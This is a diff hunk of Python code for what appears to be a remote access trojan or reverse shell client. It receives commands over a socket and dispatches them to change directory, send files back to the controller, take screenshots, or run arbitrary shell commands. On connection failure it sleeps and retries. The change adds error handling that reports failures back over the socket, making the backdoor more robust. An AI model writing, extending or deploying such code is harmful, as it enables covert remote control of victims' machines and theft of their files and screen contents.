@@ -63,16 +63,18 @@ while True:
             commands = response.split()
             
             ''' Execute Functions On Diffrent Command '''
-
-            match commands[0]:
-                case "cd":
-                    changes_dir(commands[1])
-                case "download":
-                    upload_file(commands[1])
-                case "screenshot":
-                    screenshot()
-                case _:
-                    execute_cmd(response)
+            try:
+                match commands[0]:
+                    case "cd":
+                        changes_dir(commands[1])
+                    case "download":
+                        upload_file(commands[1])
+                    case "screenshot":
+                        screenshot()
+                    case _:
+                        execute_cmd(response)
+            except:
+                sock.send(ERRO.encode())
 
     except:
         time.sleep(TIME)
